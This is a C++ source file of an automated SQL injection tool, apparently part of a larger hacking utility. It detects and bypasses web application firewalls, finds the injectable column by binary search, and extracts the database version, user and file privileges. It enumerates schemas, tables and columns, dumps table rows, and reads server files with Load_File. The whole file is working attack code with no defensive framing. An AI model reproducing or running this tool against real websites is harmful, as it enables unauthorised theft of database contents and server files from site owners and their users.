#include "exploit1.hpp"
#include "config.hpp"
#include "http_client.hpp"
#include "util.hpp"
#include <iostream>
#include <sstream>

namespace sqlij {

static std::string buildCountList(int countColumn, int exploitCol, const std::string& payload, const Exploit1Params& p) {
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::ostringstream countList;
    for (int i = 0; i < p.countColumn; ++i) {
        if (i) countList << ',';
        if (i + 1 == p.exploitColumn)
            countList << enc[p.encodeBypass].first << payload << enc[p.encodeBypass].second;
        else
            countList << (i + 1);
    }
    return p.url + sec[p.secBypass].first + countList.str() + sec[p.secBypass].second + " " + p.commentBypass;
}

bool exploit1AutoDetect(Exploit1Params& p) {
    p.url = replaceAll(p.url, "'", "");
    p.url = replaceAll(p.url, "\"", "");
    p.url = replaceAll(p.url, "=-", "=");
    auto secList = arrSecBypass();
    auto commentList = arrCommentBypass();

    for (size_t i = 0; i < secList.size(); ++i) {
        std::string testUrl = urlEncode(p.url + " " + secList[i].first + " 1 " + secList[i].second + "-- a");
        std::string page = getPage(testUrl);
        for (char& c : page) c = static_cast<char>(std::tolower(static_cast<unsigned char>(c)));
        if (page.find("forbidden") == std::string::npos && page.find("you don't have permission") == std::string::npos
            && page.find("500 internal server error") == std::string::npos && page.find("not acceptable") == std::string::npos) {
            p.secBypass = static_cast<int>(i);
            break;
        }
    }

    std::vector<std::string> a1, a9999, a10000;
    int commentIdx = -1;
    for (size_t i = 0; i < commentList.size(); ++i) {
        std::string page1 = cleanUpPage(getPage(urlEncode(p.url + " " + commentList[i].first + " Order By 1 " + commentList[i].second)));
        splitByStr(page1, "vndarkcode", a1);

        std::string page9999 = cleanUpPage(getPage(urlEncode(p.url + " " + commentList[i].first + " Order By 9999 " + commentList[i].second)));
        splitByStr(page9999, "vndarkcode", a9999);

        std::string page10000 = cleanUpPage(getPage(urlEncode(p.url + " " + commentList[i].first + " Order By 10000 " + commentList[i].second)));
        splitByStr(page10000, "vndarkcode", a10000);

        if (check(a1, a9999, a10000) == -1) {
            commentIdx = static_cast<int>(i);
            p.commentBypass = commentList[i].second;
            break;
        }
    }
    if (commentIdx < 0) return false;

    // Binary search column count
    int countColumn = 0;
    for (int lo : {1, 20}) {
        int hi = (lo == 1) ? 20 : 80;
        int mid = (lo + hi) / 2;
        while (hi - lo > 1) {
            std::string page = cleanUpPage(getPage(urlEncode(p.url + " " + commentList[commentIdx].first + " Order By " + std::to_string(mid) + " " + p.commentBypass)));
            std::vector<std::string> a;
            splitByStr(page, "vndarkcode", a);
            int r = check(a1, a, a10000);
            if (r == 1) { lo = mid; mid = (lo + hi) / 2; }
            else if (r == -1) { hi = mid; mid = (lo + hi) / 2; }
            else break;
        }
        std::string pageHi = cleanUpPage(getPage(urlEncode(p.url + " " + commentList[commentIdx].first + " Order By " + std::to_string(hi) + " " + p.commentBypass)));
        std::vector<std::string> aHi;
        splitByStr(pageHi, "vndarkcode", aHi);
        if (check(a1, aHi, a10000) == 1) {
            countColumn = hi;
            break;
        } else if (check(a1, aHi, a10000) == -1) {
            countColumn = lo;
            break;
        }
    }
    if (countColumn <= 0) return false;
    p.countColumn = countColumn;

    // Find exploit column (which column is echoed)
    std::vector<std::string> countParts;
    for (int i = 0; i < countColumn; ++i)
        countParts.push_back("Concat(0x3a3a3a," + std::to_string(i + 1) + ",0x3a3a3a)");
    auto sec = arrSecBypass();
    std::string countStr;
    for (size_t i = 0; i < countParts.size(); ++i)
        countStr += (i ? "," : "") + countParts[i];
    std::string baseUrl = p.url;
    std::string suffix = baseUrl;
    size_t eq = suffix.rfind('=');
    if (eq != std::string::npos) suffix = suffix.substr(eq);
    std::string testUrls[] = {
        replaceAll(baseUrl, suffix, "=-" + suffix.substr(1)),
        baseUrl + " And 1=0 ",
        baseUrl,
        replaceAll(baseUrl, suffix, "=null")
    };
    int exploitColumn = 0;
    for (const std::string& u : testUrls) {
        std::string full = urlEncode(u + commentList[commentIdx].first + sec[p.secBypass].first + countStr + sec[p.secBypass].second + p.commentBypass);
        std::string page = getPage(full);
        std::string match;
        if (extractBetween(page, ":::", ":::", match)) {
            exploitColumn = std::stoi(match);
            break;
        }
    }
    if (exploitColumn <= 0) return false;
    p.exploitColumn = exploitColumn;

    // Encode bypass
    auto enc = arrEncodeBypass();
    for (size_t i = 0; i < enc.size(); ++i) {
        std::string payload = "Concat(0x3a3a3a,(Version()),0x3a3a3a)";
        std::string countList;
        for (int c = 0; c < p.countColumn; ++c) {
            if (c) countList += ',';
            if (c + 1 == p.exploitColumn)
                countList += enc[i].first + payload + enc[i].second;
            else
                countList += std::to_string(c + 1);
        }
        std::string full = urlEncode(p.url + commentList[commentIdx].first + sec[p.secBypass].first + countList + sec[p.secBypass].second + p.commentBypass);
        std::string page = getPage(full);
        if (page.find(":::") != std::string::npos) {
            p.encodeBypass = static_cast<int>(i);
            if (commentList[commentIdx].first.find('\'') != std::string::npos)
                p.url = p.url + commentList[commentIdx].first;
            break;
        }
    }
    return true;
}

bool exploit1GetInfo(Exploit1Params& p, std::string& version, std::string& user, std::string& database, std::string& filePriv) {
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::vector<int> count(p.countColumn);
    for (int i = 0; i < p.countColumn; ++i) count[i] = i + 1;

    std::string payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Version(),0x2c2c,User(),0x2c2c,Database(),0x3a3a3a))" + enc[p.encodeBypass].second;
    count[p.exploitColumn - 1] = 0; // placeholder
    std::ostringstream countStr;
    for (int i = 0; i < p.countColumn; ++i)
        countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
    std::string url = urlEncode(p.url + " " + sec[p.secBypass].first + countStr.str() + " " + sec[p.secBypass].second + " " + p.commentBypass);
    std::string page = getPage(url);
    std::string block;
    if (!extractBetween(page, ":::", ":::", block)) return false;
    std::vector<std::string> parts;
    split(block, ',', parts);
    if (parts.size() < 3) return false;
    version = parts[0];
    user = parts[1];
    database = parts[2];

    std::string userForAscii = user;
    size_t at = userForAscii.find('@');
    if (at != std::string::npos) userForAscii = userForAscii.substr(0, at);
    std::string payload2 = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,(Select file_priv From mysql.user Where user=" + asciiMysql(userForAscii) + "),0x3a3a3a))" + enc[p.encodeBypass].second;
    countStr.str("");
    for (int i = 0; i < p.countColumn; ++i)
        countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload2 : std::to_string(i + 1));
    url = urlEncode(p.url + " " + sec[p.secBypass].first + countStr.str() + " " + sec[p.secBypass].second + " " + p.commentBypass);
    page = getPage(url);
    if (extractBetween(page, ":::", ":::", filePriv) && !filePriv.empty()) { /* got it */ }
    else filePriv = "unknown";
    return true;
}

bool exploit1GetDbs(Exploit1Params& p, std::vector<std::string>& dbs) {
    dbs.clear();
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::string payload;
    if (p.useGroupConcat) {
        payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Substr(Group_Concat(Schema_Name),1,10000),0x3a3a3a))" + enc[p.encodeBypass].second;
        std::ostringstream countStr;
        for (int i = 0; i < p.countColumn; ++i)
            countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
        std::string url = urlEncode(p.url + " " + sec[p.secBypass].first + countStr.str() + " From Information_Schema.Schemata " + sec[p.secBypass].second + " " + p.commentBypass);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", ":::", block)) return false;
        split(block, ',', dbs);
        return true;
    }
    int offset = 0;
    while (true) {
        std::ostringstream q;
        for (int i = 0; i < p.speed; ++i)
            q << (i ? "," : "") << "(Select Schema_Name From Information_Schema.Schemata Limit " << (offset + i) << ",1)";
        payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,concat_Ws(0x2c," + q.str() + "),0x3a3a3a))" + enc[p.encodeBypass].second;
        std::ostringstream countStr;
        for (int i = 0; i < p.countColumn; ++i)
            countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
        std::string url = urlEncode(p.url + "+" + sec[p.secBypass].first + countStr.str() + " " + sec[p.secBypass].second + " " + p.commentBypass);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", ":::", block)) break;
        std::vector<std::string> row;
        split(block, ',', row);
        bool any = false;
        for (const auto& r : row) {
            std::string t = trim(r);
            if (!t.empty()) { dbs.push_back(t); any = true; }
        }
        if (!any) break;
        offset += p.speed;
    }
    return true;
}

bool exploit1GetTables(Exploit1Params& p, const std::string& db, std::vector<std::string>& tables) {
    tables.clear();
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::string payload;
    if (p.useGroupConcat) {
        payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Substr(Group_Concat(Table_Name),1,10000),0x3a3a3a))" + enc[p.encodeBypass].second;
        std::ostringstream countStr;
        for (int i = 0; i < p.countColumn; ++i)
            countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
        std::string url = urlEncode(p.url + "+" + sec[p.secBypass].first + countStr.str() + " From Information_Schema.Tables Where Table_Schema=" + asciiMysql(db) + " " + sec[p.secBypass].second + " " + p.commentBypass);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", ":::", block)) return false;
        split(block, ',', tables);
        return true;
    }
    int offset = 0;
    while (true) {
        std::ostringstream q;
        for (int i = 0; i < p.speed; ++i)
            q << (i ? "," : "") << "(Select Table_Name From Information_Schema.Tables Where Table_Schema=" << asciiMysql(db) << " Limit " << (offset + i) << ",1)";
        payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Concat_Ws(0x2c," + q.str() + "),0x3a3a3a))" + enc[p.encodeBypass].second;
        std::ostringstream countStr;
        for (int i = 0; i < p.countColumn; ++i)
            countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
        std::string url = urlEncode(p.url + "+" + sec[p.secBypass].first + countStr.str() + " " + sec[p.secBypass].second + " " + p.commentBypass);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", ":::", block)) break;
        std::vector<std::string> row;
        split(block, ',', row);
        bool any = false;
        for (const auto& r : row) {
            std::string t = trim(r);
            if (!t.empty()) { tables.push_back(t); any = true; }
        }
        if (!any) break;
        offset += p.speed;
    }
    return true;
}

bool exploit1GetColumns(Exploit1Params& p, const std::string& db, const std::string& table, std::vector<std::string>& columns) {
    columns.clear();
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::string payload;
    if (p.useGroupConcat) {
        payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Substr(Group_Concat(Column_Name),1,10000),0x3a3a3a))" + enc[p.encodeBypass].second;
        std::ostringstream countStr;
        for (int i = 0; i < p.countColumn; ++i)
            countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
        std::string url = urlEncode(p.url + sec[p.secBypass].first + countStr.str() + " From Information_Schema.Columns Where Table_Schema=" + asciiMysql(db) + " And Table_Name=" + asciiMysql(table) + " " + sec[p.secBypass].second + " " + p.commentBypass);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", ":::", block)) return false;
        split(block, ',', columns);
        return true;
    }
    int offset = 0;
    while (true) {
        std::ostringstream q;
        for (int i = 0; i < p.speed; ++i)
            q << (i ? "," : "") << "(Select Column_Name From Information_Schema.Columns Where Table_Schema=" << asciiMysql(db) << " And Table_Name=" << asciiMysql(table) << " Limit " << (offset + i) << ",1)";
        payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Concat_Ws(0x2c," + q.str() + "),0x3a3a3a))" + enc[p.encodeBypass].second;
        std::ostringstream countStr;
        for (int i = 0; i < p.countColumn; ++i)
            countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
        std::string url = urlEncode(p.url + "+" + sec[p.secBypass].first + countStr.str() + " " + sec[p.secBypass].second + " " + p.commentBypass);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", ":::", block)) break;
        std::vector<std::string> row;
        split(block, ',', row);
        bool any = false;
        for (const auto& r : row) {
            std::string t = trim(r);
            if (!t.empty()) { columns.push_back(t); any = true; }
        }
        if (!any) break;
        offset += p.speed;
    }
    return true;
}

bool exploit1GetCount(Exploit1Params& p, const std::string& db, const std::string& table, int& count) {
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::string payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Count(*),0x3a3a3a))" + enc[p.encodeBypass].second;
    std::ostringstream countStr;
    for (int i = 0; i < p.countColumn; ++i)
        countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
    std::string url = urlEncode(p.url + " " + sec[p.secBypass].first + countStr.str() + " From " + db + "." + table + " " + sec[p.secBypass].second + " " + p.commentBypass);
    std::string page = getPage(url);
    std::string block;
    if (!extractBetween(page, ":::", ":::", block)) return false;
    count = std::stoi(trim(block));
    return true;
}

bool exploit1GetIdRange(Exploit1Params& p, const std::string& db, const std::string& table, const std::string& column, int& cnt, std::string& maxId, std::string& minId) {
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::string payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Count(" + column + "),0x2c,Max(" + column + "),0x2c,Min(" + column + "),0x3a3a3a))" + enc[p.encodeBypass].second;
    std::ostringstream countStr;
    for (int i = 0; i < p.countColumn; ++i)
        countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
    std::string url = urlEncode(p.url + " " + sec[p.secBypass].first + countStr.str() + " From " + db + "." + table + " " + sec[p.secBypass].second + " " + p.commentBypass);
    std::string page = getPage(url);
    std::string block;
    if (!extractBetween(page, ":::", ":::", block)) return false;
    std::vector<std::string> parts;
    split(block, ',', parts);
    if (parts.size() < 3) return false;
    cnt = std::stoi(trim(parts[0]));
    maxId = trim(parts[1]);
    minId = trim(parts[2]);
    return true;
}

bool exploit1LoadFile(Exploit1Params& p, const std::string& filePath, std::string& content) {
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::string payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a3a3a3a,Load_File(" + asciiMysql(filePath) + "),0x3a3a3a3a3a3a))" + enc[p.encodeBypass].second;
    std::ostringstream countStr;
    for (int i = 0; i < p.countColumn; ++i)
        countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
    std::string url = urlEncode(p.url + " " + sec[p.secBypass].first + countStr.str() + " " + sec[p.secBypass].second + " " + p.commentBypass);
    std::string page = getPage(url);
    page = replaceAll(page, "\n", "vndarkcode");
    if (!extractBetween(page, "::::::", "::::::", content)) return false;
    content = replaceAll(content, "vndarkcode", "\n");
    return true;
}

bool exploit1GetData(Exploit1Params& p, const std::string& db, const std::string& table,
    const std::string& listColumns, const std::string& columnFilter, int from, int to,
    const std::string& addition, int orderBy, std::vector<std::string>& rows) {
    rows.clear();
    auto enc = arrEncodeBypass();
    auto sec = arrSecBypass();
    std::string addClause = addition.empty() ? "" : " And " + addition;
    int offset = 0;
    while (offset <= to - from) {
        std::ostringstream q;
        for (int i = 0; i < p.speed; ++i) {
            int rowOff = offset + i;
            if (i) q << ",";
            if (!columnFilter.empty())
                q << "(Select Concat_Ws(Char(32,124,32)," << listColumns << ") From " << db << "." << table << " Where " << columnFilter << ">=" << from << " And " << columnFilter << "<=" << to << addClause << " Order By " << orderBy << " Asc Limit " << rowOff << ",1)";
            else
                q << "(Select Concat_Ws(Char(32,124,32)," << listColumns << ") From " << db << "." << table << " Where 1 " << addClause << " Limit " << rowOff << ",1)";
        }
        std::string payload = enc[p.encodeBypass].first + "(Concat(0x3a3a3a,Concat_Ws(0x2c2c," + q.str() + "),0x3a3a3a))" + enc[p.encodeBypass].second;
        std::ostringstream countStr;
        for (int i = 0; i < p.countColumn; ++i)
            countStr << (i ? "," : "") << (i + 1 == p.exploitColumn ? payload : std::to_string(i + 1));
        std::string url = urlEncode(p.url + " " + sec[p.secBypass].first + countStr.str() + " " + sec[p.secBypass].second + " " + p.commentBypass);
        std::string page = getPage(url);
        std::string block;
        if (!extractBetween(page, ":::", ":::", block)) { offset += p.speed; continue; }
        std::vector<std::string> parts;
        split(block, ',', parts);
        for (const auto& part : parts) {
            std::string t = trim(part);
            if (!t.empty()) rows.push_back(t);
        }
        if (parts.empty() || (parts.size() == 1 && trim(parts[0]).empty())) break;
        offset += p.speed;
    }
    return true;
}

} // namespace sqlij
